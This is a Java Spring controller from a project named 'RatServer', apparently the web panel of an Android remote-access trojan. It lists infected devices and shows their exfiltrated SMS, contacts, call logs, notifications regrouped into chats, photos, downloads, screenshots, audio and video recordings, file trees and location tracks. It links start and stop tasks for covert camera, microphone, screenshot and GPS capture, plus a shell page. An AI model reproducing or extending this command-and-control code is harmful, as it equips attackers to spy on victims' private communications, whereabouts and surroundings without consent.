package com.chsbk.RatServer.controllers;

import com.google.gson.Gson;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestParam;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

@Controller
public class WebController {
    @Autowired
    private DeviceRepository deviceRepository;
    @Autowired
    UploadCommandsStateService uploadCommandsStateService;
    @GetMapping("/linux-devices")
    public String linuxDevices() {
        return "linux_devices_nav";
    }
    @GetMapping("/windows-devices")
    public String windowsDevices() {
        return "win_devices_nav";
    }
    @GetMapping("/select-device-type")
    public String getDevices(@RequestParam(required = false) String type, Model model) {
        List<Device> devices;
        if (type != null) {
            devices = deviceRepository.findByType(type);
        } else {
            devices = deviceRepository.findAll();
        }
        System.out.println("Devices found: " + devices.size());
        for (Device device : devices) {
            System.out.println(device.getName());
        }
        model.addAttribute("devices", devices);
        return "devices_nav";
    }
    @GetMapping("/android-device/{id}")
    public String androidDevice(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device != null) {
            model.addAttribute("device", device);
            model.addAttribute("welcomeUrl", "/android-device/" + id + "/welcome");
            model.addAttribute("commandsState", uploadCommandsStateService.getCommandsStatesByDeviceId(id));
        }
        return "android_device";
    }

    @GetMapping("/android-device/{id}/screenshots")
    public String getScreenshots(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }
        Path screenshotsPath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "screenshots");
        List<String> screenshotFiles = new ArrayList<>();
        try (DirectoryStream<Path> stream = Files.newDirectoryStream(screenshotsPath, "*.{png,jpg,jpeg}")) {
            for (Path file : stream) {
                screenshotFiles.add("/uploaded_files/" + device.getName() + "/screenshots/" + file.getFileName().toString());
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        List<String> lastThreeScreenshots = screenshotFiles.stream()
                .sorted((a, b) -> {
                    try {
                        Path pathA = Paths.get(System.getProperty("user.dir") + a);
                        Path pathB = Paths.get(System.getProperty("user.dir") + b);
                        return Files.getLastModifiedTime(pathB).compareTo(Files.getLastModifiedTime(pathA));
                    } catch (IOException e) {
                        e.printStackTrace();
                        return 0;
                    }
                })
                .limit(3)
                .collect(Collectors.toList());
        Path zipFilePath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "screenshots.zip");
        try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zipFilePath))) {
            for (String file : screenshotFiles) {
                Path filePath = Paths.get(System.getProperty("user.dir") + file);
                zos.putNextEntry(new ZipEntry(filePath.getFileName().toString()));
                Files.copy(filePath, zos);
                zos.closeEntry();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        String zipFileUrl = "/uploaded_files/" + device.getName() + "/screenshots.zip";
        String startButtonHref = "/android-device/start-screenshot-task/"+device.getId();
        String stopButtonHref = "/android-device/stop-screenshot-task/"+device.getId();
        model.addAttribute("startButtonHref", startButtonHref);
        model.addAttribute("stopButtonHref", stopButtonHref);
        model.addAttribute("device", device);
        model.addAttribute("screenshotFiles", lastThreeScreenshots);
        model.addAttribute("zipFileUrl", zipFileUrl);
        return "android/screenshots :: content";
    }
    @GetMapping("/android-device/{id}/welcome")
    public String welcomeFragment(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }
        model.addAttribute("commandsState", uploadCommandsStateService.getCommandsStatesByDeviceId(id));
        model.addAttribute("device", device);
        return "android/welcome :: content";
    }
    @GetMapping("/android-device/{id}/sms")
    public String getSms(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }
        Path smsPath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "sms");
        List<String> smsFiles = new ArrayList<>();
        Path zipFilePath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "sms_archive.zip");
        try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zipFilePath))) {
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(smsPath)) {
                for (Path file : stream) {
                    smsFiles.add("/uploaded_files/" + device.getName() + "/sms/" + file.getFileName().toString());
                    ZipEntry zipEntry = new ZipEntry(file.getFileName().toString());
                    zos.putNextEntry(zipEntry);
                    Files.copy(file, zos);
                    zos.closeEntry();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        String exportAllSmsButtonHref = "/android-device/export-all-sms-task/"+device.getId();
        model.addAttribute("exportAllSmsButtonHref", exportAllSmsButtonHref);
        model.addAttribute("device", device);
        model.addAttribute("zipFileUrl", "/uploaded_files/" + device.getName() + "/sms_archive.zip");
        return "android/sms_logs :: content";
    }
    @GetMapping("/android-device/{id}/contacts")
    public String getContacts(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }
        Path contactsPath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "contacts");
        List<String> contactsFiles = new ArrayList<>();
        Path zipFilePath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "contacts_archive.zip");
        try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zipFilePath))) {
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(contactsPath)) {
                for (Path file : stream) {
                    contactsFiles.add("/uploaded_files/" + device.getName() + "/contacts/" + file.getFileName().toString());
                    ZipEntry zipEntry = new ZipEntry(file.getFileName().toString());
                    zos.putNextEntry(zipEntry);
                    Files.copy(file, zos);
                    zos.closeEntry();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        String exportAllButtonHref = "/android-device/export-all-contacts-task/"+device.getId();
        model.addAttribute("exportAllButtonHref", exportAllButtonHref);
        model.addAttribute("device", device);
        model.addAttribute("zipFileUrl", "/uploaded_files/" + device.getName() + "/contacts_archive.zip");
        return "android/contacts :: content";
    }
    @GetMapping("/android-device/{id}/downloads")
    public String getDownloads(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }
        Path downloadsPath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "downloads");
        List<String> downloadsFiles = new ArrayList<>();
        Path zipFilePath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "downloads_archive.zip");
        try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zipFilePath))) {
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(downloadsPath)) {
                for (Path file : stream) {
                    downloadsFiles.add("/uploaded_files/" + device.getName() + "/downloads/" + file.getFileName().toString());
                    ZipEntry zipEntry = new ZipEntry(file.getFileName().toString());
                    zos.putNextEntry(zipEntry);
                    Files.copy(file, zos);
                    zos.closeEntry();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        String exportAllButtonHref = "/android-device/export-all-downloads-task/"+device.getId();
        model.addAttribute("exportAllButtonHref", exportAllButtonHref);
        model.addAttribute("device", device);
        model.addAttribute("zipFileUrl", "/uploaded_files/" + device.getName() + "/downloads_archive.zip");
        return "android/downloads :: content";
    }
    @GetMapping("/android-device/{id}/screenshotsdir")
    public String getScreenshotsDir(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }
        Path screenshotsDirPath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "screenshotsdir");
        List<String> screenshotsDirFiles = new ArrayList<>();
        Path zipFilePath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "screenshotsDir_archive.zip");
        try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zipFilePath))) {
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(screenshotsDirPath)) {
                for (Path file : stream) {
                    screenshotsDirFiles.add("/uploaded_files/" + device.getName() + "/screenshotsdir/" + file.getFileName().toString());
                    ZipEntry zipEntry = new ZipEntry(file.getFileName().toString());
                    zos.putNextEntry(zipEntry);
                    Files.copy(file, zos);
                    zos.closeEntry();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        String exportAllButtonHref = "/android-device/export-all-screenshotsDir-task/"+device.getId();
        model.addAttribute("exportAllButtonHref", exportAllButtonHref);
        model.addAttribute("device", device);
        model.addAttribute("zipFileUrl", "/uploaded_files/" + device.getName() + "/screenshotsDir_archive.zip");
        return "android/screenshotsdir :: content";
    }


    @GetMapping("/android-device/{id}/dcim")
    public String getDcim(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }
        Path dcimPath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "dcim");
        List<String> dcimFiles = new ArrayList<>();
        Path zipFilePath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "dcim_archive.zip");
        try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zipFilePath))) {
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(dcimPath)) {
                for (Path file : stream) {
                    dcimFiles.add("/uploaded_files/" + device.getName() + "/dcim/" + file.getFileName().toString());
                    ZipEntry zipEntry = new ZipEntry(file.getFileName().toString());
                    zos.putNextEntry(zipEntry);
                    Files.copy(file, zos);
                    zos.closeEntry();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        String exportAllButtonHref = "/android-device/export-all-dcim-task/"+device.getId();
        model.addAttribute("exportAllButtonHref", exportAllButtonHref);
        model.addAttribute("device", device);
        model.addAttribute("zipFileUrl", "/uploaded_files/" + device.getName() + "/dcim_archive.zip");
        return "android/dcim :: content";
    }
    @GetMapping(value = "/android-device/{id}/notifications", produces = "text/html; charset=UTF-8")
    public String getNotifications(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }
        Path notificationsPath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "notifications");
        Path outputFilePath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(),"notifications", "chat_summary.txt");
        Map<String, List<Notification>> chatGroups = new HashMap<>();

        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");

        try (DirectoryStream<Path> stream = Files.newDirectoryStream(notificationsPath)) {
            for (Path file : stream) {
                List<String> lines = Files.readAllLines(file, StandardCharsets.UTF_8);
                StringBuilder currentNotificationText = new StringBuilder();
                String currentTitle = "";
                String packageName = "";
                LocalDateTime currentTimestamp = null;

                for (String line : lines) {
                    if (line.startsWith("Package: ")) {
                        packageName = line;
                    } else if (line.startsWith("Title: ")) {
                        currentTitle = line.substring(7).trim();
                    } else if (line.startsWith("Timestamp: ")) {
                        currentTimestamp = LocalDateTime.parse(line.substring(11).trim(), formatter);
                    }
                    currentNotificationText.append(line).append(System.lineSeparator());
                    if (line.startsWith("Timestamp: ")) {
                        Notification notification = new Notification(currentTitle, currentNotificationText.toString(), currentTimestamp, packageName);
                        chatGroups.computeIfAbsent(currentTitle, k -> new ArrayList<>()).add(notification);
                        currentNotificationText.setLength(0);  // Clear the StringBuilder for the next notification
                    }
                }
            }

            try (BufferedWriter writer = new BufferedWriter(new FileWriter(outputFilePath.toFile(), StandardCharsets.UTF_8))) {
                for (Map.Entry<String, List<Notification>> entry : chatGroups.entrySet()) {
                    List<Notification> notifications = entry.getValue();
                    Collections.sort(notifications, Comparator.comparing(Notification::getTimestamp));
                    writer.write("Chat with: " + entry.getKey());
                    writer.newLine();
                    writer.write("========================================");
                    writer.newLine();
                    writer.write(notifications.get(0).getPackageName());
                    writer.newLine();
                    for (Notification notification : notifications) {
                        String[] lines = notification.getText().split(System.lineSeparator());
                        for (String line : lines) {
                            if (!line.startsWith("Package: ") && !line.startsWith("Key: ") && !line.startsWith("Timestamp: ")) {
                                writer.write(line);
                                writer.newLine();
                            }
                        }
                        writer.newLine();
                    }
                    writer.write("========================================");
                    writer.newLine();
                    writer.newLine();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        String startButtonHref = "/android-device/start-notification-task/"+device.getId();
        String stopButtonHref = "/android-device/stop-notification-task/"+device.getId();
        model.addAttribute("startButtonHref", startButtonHref);
        model.addAttribute("stopButtonHref", stopButtonHref);
        model.addAttribute("device", device);
        model.addAttribute("zipFileUrl", "/uploaded_files/" + device.getName() + "/notifications/chat_summary.txt");
        return "android/notifications :: content";
    }
    @GetMapping("/android-device/{id}/video")
    public String getVideo(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }
        Path videoPath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "video");
        List<String> videoFiles = new ArrayList<>();
        Path latestVideoFile = null;
        Path zipFilePath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "video_archive.zip");
        try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zipFilePath))) {
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(videoPath)) {
                for (Path file : stream) {
                    videoFiles.add("/uploaded_files/" + device.getName() + "/video/" + file.getFileName().toString());
                    ZipEntry zipEntry = new ZipEntry(file.getFileName().toString());
                    zos.putNextEntry(zipEntry);
                    Files.copy(file, zos);
                    zos.closeEntry();
                    if (latestVideoFile == null || Files.getLastModifiedTime(file).compareTo(Files.getLastModifiedTime(latestVideoFile)) > 0) {
                        latestVideoFile = file;
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        if(device.getCameraInd()==null){
            device.setCameraInd("3");
        }
        String startButtonHref = "/android-device/start-camera-task/"+device.getId();
        String stopButtonHref = "/android-device/stop-camera-task/"+device.getId();
        model.addAttribute("startButtonHref", startButtonHref);
        model.addAttribute("stopButtonHref", stopButtonHref);
        model.addAttribute("device", device);
        model.addAttribute("zipFileUrl", "/uploaded_files/" + device.getName() + "/video_archive.zip");
        model.addAttribute("latestVideoFileUrl", latestVideoFile != null ? "/uploaded_files/" + device.getName() + "/video/" + latestVideoFile.getFileName().toString() : null);
        return "android/video :: content";
    }
    @GetMapping("/android-device/{id}/audio")
    public String getAuidio(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }
        Path audioPath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "audio");
        List<String> audioFiles = new ArrayList<>();
        Path latestAudioFile = null;
        Path zipFilePath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "audio_archive.zip");
        try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zipFilePath))) {
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(audioPath)) {
                for (Path file : stream) {
                    audioFiles.add("/uploaded_files/" + device.getName() + "/audio/" + file.getFileName().toString());
                    ZipEntry zipEntry = new ZipEntry(file.getFileName().toString());
                    zos.putNextEntry(zipEntry);
                    Files.copy(file, zos);
                    zos.closeEntry();
                    if (latestAudioFile == null || Files.getLastModifiedTime(file).compareTo(Files.getLastModifiedTime(latestAudioFile)) > 0) {
                        latestAudioFile = file;
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        String startButtonHref = "/android-device/start-audio-task/"+device.getId();
        String stopButtonHref = "/android-device/stop-audio-task/"+device.getId();
        model.addAttribute("startButtonHref", startButtonHref);
        model.addAttribute("stopButtonHref", stopButtonHref);
        model.addAttribute("device", device);
        model.addAttribute("zipFileUrl", "/uploaded_files/" + device.getName() + "/audio_archive.zip");
        model.addAttribute("latestVideoFileUrl", latestAudioFile != null ? "/uploaded_files/" + device.getName() + "/audio/" + latestAudioFile.getFileName().toString() : null);
        return "android/audio :: content";
    }
    @GetMapping("/android-device/{id}/geolocation")
    public String getGeolocation(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }
        Path geolocationsPath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "geolocation");
        List<String> geolocationJsons = new ArrayList<>();
        Geolocation lastGeoTrack = null;
        Gson gson = new Gson();
        try {
            if (Files.exists(geolocationsPath) && Files.isDirectory(geolocationsPath)) {
                List<Path> geoFiles = Files.list(geolocationsPath)
                        .filter(Files::isRegularFile)
                        .sorted(Comparator.comparing(Path::getFileName).reversed()) // Сортировка в обратном порядке
                        .limit(500) // Ограничение до 500 файлов
                        .collect(Collectors.toList());

                for (Path geoFile : geoFiles) {
                    String content = new String(Files.readAllBytes(geoFile));
                    geolocationJsons.add(content);
                }
                if (!geoFiles.isEmpty()) {
                    Path lastGeoFile = geoFiles.get(0); // Первый файл после сортировки
                    if (lastGeoFile != null) {
                        String lastGeoContent = new String(Files.readAllBytes(lastGeoFile));
                        lastGeoTrack = gson.fromJson(lastGeoContent, Geolocation.class);
                    }
                }
            }
            if (lastGeoTrack == null) {
                lastGeoTrack = new Geolocation();
                lastGeoTrack.setLatitude("55.751244");
                lastGeoTrack.setLongitude("37.618423");
                geolocationJsons.add(gson.toJson(lastGeoTrack));
            }
        } catch (IOException e) {
            model.addAttribute("error", "Error reading geolocation files");
            return "error";
        }
        String startButtonHref = "/android-device/start-geolocation-task/" + device.getId();
        String stopButtonHref = "/android-device/stop-geolocation-task/" + device.getId();
        model.addAttribute("startButtonHref", startButtonHref);
        model.addAttribute("stopButtonHref", stopButtonHref);
        model.addAttribute("device", device);
        model.addAttribute("geolocationJsons", geolocationJsons);
        model.addAttribute("lastGeoTrack", lastGeoTrack);
        return "geolocation";
    }

    @GetMapping("/android-device/{id}/explorer")
    public String getExplorer(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }

        Path explorerJsonPath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(),"storage_tree", "storage_tree.json");
        JsonObject jsonTree;
        try {
            if (Files.exists(explorerJsonPath) && Files.isRegularFile(explorerJsonPath)) {
                jsonTree = parseJsonFile(explorerJsonPath);
            } else {
                jsonTree = generateSampleJsonTree();
            }
        } catch (IOException e) {
            model.addAttribute("error", "Error reading explorer files");
            return "error";
        }

        String exportAllButtonHref = "/android-device/export-all-external-task/" + device.getId();
        model.addAttribute("exportAllButtonHref", exportAllButtonHref);
        model.addAttribute("device", device);
        model.addAttribute("jsonTree", jsonTree.toString()); // Convert JsonObject to String
        return "explorer";
    }

    private JsonObject parseJsonFile(Path jsonFilePath) throws IOException {
        String content = new String(Files.readAllBytes(jsonFilePath), StandardCharsets.UTF_8);
        JsonElement jsonElement = JsonParser.parseString(content);
        return jsonElement.getAsJsonObject();
    }

    private JsonObject generateSampleJsonTree() {
        JsonObject sampleTree = new JsonObject();
        JsonObject folder1 = new JsonObject();
        JsonObject subfolder1 = new JsonObject();
        subfolder1.add("file1.txt", null);
        subfolder1.add("file2.txt", null);
        folder1.add("subfolder1", subfolder1);
        JsonObject subfolder2 = new JsonObject();
        subfolder2.add("file3.txt", null);
        folder1.add("subfolder2", subfolder2);
        JsonObject folder2 = new JsonObject();
        folder2.add("file4.txt", null);
        sampleTree.add("folder1", folder1);
        sampleTree.add("folder2", folder2);
        return sampleTree;
    }
    @GetMapping("/android-device/{id}/call_logs")
    public String getCallLogs(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }
        Path callLogsPath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "call_logs");
        List<String> callLogsFiles = new ArrayList<>();
        Path zipFilePath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "call_logs_archive.zip");
        try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zipFilePath))) {
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(callLogsPath)) {
                for (Path file : stream) {
                    callLogsFiles.add("/uploaded_files/" + device.getName() + "/call_logs/" + file.getFileName().toString());
                    ZipEntry zipEntry = new ZipEntry(file.getFileName().toString());
                    zos.putNextEntry(zipEntry);
                    Files.copy(file, zos);
                    zos.closeEntry();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        String exportAllButtonHref = "/android-device/export-all-callLogs-task/"+device.getId();
        model.addAttribute("exportAllButtonHref", exportAllButtonHref);
        model.addAttribute("device", device);
        model.addAttribute("zipFileUrl", "/uploaded_files/" + device.getName() + "/call_logs_archive.zip");
        return "android/call_logs :: content";
    }
    @GetMapping("/android-device/{id}/shell")
    public String getShell(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }

        String exportAllButtonHref = "/android-device/export-all-callLogs-task/"+device.getId();
   //     model.addAttribute("exportAllButtonHref", exportAllButtonHref);
        model.addAttribute("device", device);
       // model.addAttribute("zipFileUrl", "/uploaded_files/" + device.getName() + "/call_logs_archive.zip");
        return "android/shell :: content";
    }
    @GetMapping("/android-device/{id}/logs")
    public String getLogs(@PathVariable String id, Model model) {
        Device device = deviceRepository.findById(id).orElse(null);
        if (device == null) {
            model.addAttribute("error", "Device not found");
            return "error";
        }

        Path logsPath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "appSysLogs");
        Path zipFilePath = Paths.get(System.getProperty("user.dir"), "uploaded_files", device.getName(), "logs_archive.zip");

        try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zipFilePath))) {
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(logsPath)) {
                for (Path file : stream) {
                    ZipEntry zipEntry = new ZipEntry(file.getFileName().toString());
                    zos.putNextEntry(zipEntry);
                    Files.copy(file, zos);
                    zos.closeEntry();
                }
            }
        } catch (IOException e) {
            model.addAttribute("error", "Unable to create zip file");
            return "erro1r";
        }

        StringBuilder logs = new StringBuilder();
        try {
            List<Path> logFiles = Files.list(logsPath)
                    .filter(Files::isRegularFile)
                    .sorted(Comparator.comparingLong((Path p) -> {
                        try {
                            return Files.getLastModifiedTime(p).toMillis();
                        } catch (IOException e) {
                            return 0L;
                        }
                    }).reversed())
                    .toList();

            if (!logFiles.isEmpty()) {
                Path latestLogFile = logFiles.get(0);
                long fileSize = Files.size(latestLogFile);
                if (fileSize > 0) {
                    List<String> lines = Files.readAllLines(latestLogFile);
                    for (String line : lines) {
                        logs.append(line).append(System.lineSeparator());
                    }
                } else {
                    System.out.println("Log file is empty.");
                }
            } else {
                System.out.println("No log files found.");
            }
        } catch (IOException e) {
            model.addAttribute("error", "Unable to read log file");
            return "error";
        }
        model.addAttribute("device", device);
        model.addAttribute("logs", logs.toString());
        model.addAttribute("zipFileUrl", "/uploaded_files/" + device.getName() + "/logs_archive.zip");
        return "android/logs";
    }
}
